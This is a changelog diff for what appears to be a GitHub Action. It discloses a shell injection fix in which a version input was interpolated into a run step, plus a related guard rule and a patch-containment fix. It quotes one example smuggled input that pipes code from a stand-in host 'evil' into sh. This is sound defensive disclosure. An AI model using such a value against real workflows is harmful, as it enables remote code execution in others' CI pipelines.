@@ -6,6 +6,12 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
+### Security
+- **Shell Injection via `inputs.version`** (#604):
+  - `action.yml`'s install step interpolated `${{ inputs.version }}` directly into its `run:` body. A GitHub expression is substituted textually before bash parses the line, so a caller passing `version: '1.0"; curl evil | sh; "'` executes arbitrary shell in the action's step. #584 moved `args`, the PR number and the base ref into `env:` for exactly this reason and left this one behind — the sweep it described in the plural was done in the singular.
+  - Now passed as `INPUT_VERSION` through `env:` like every other caller-supplied input.
+  - The guard is a rule over every step, not an assertion about one line: no `run:` body may contain a `${{ }}` expression, with a vacuity check so it cannot pass when there are no run bodies left, and a positive counterpart asserting each input still reaches the script through `env:`.
+
 
 ### Security
 - **Patch Containment Now Asks Git Instead Of Reading Headers** (#603): `apply_patch_suggestion` derives the set of paths a patch would touch from `git apply --numstat -z --summary --check`, and refuses unless it is exactly the suggested file.
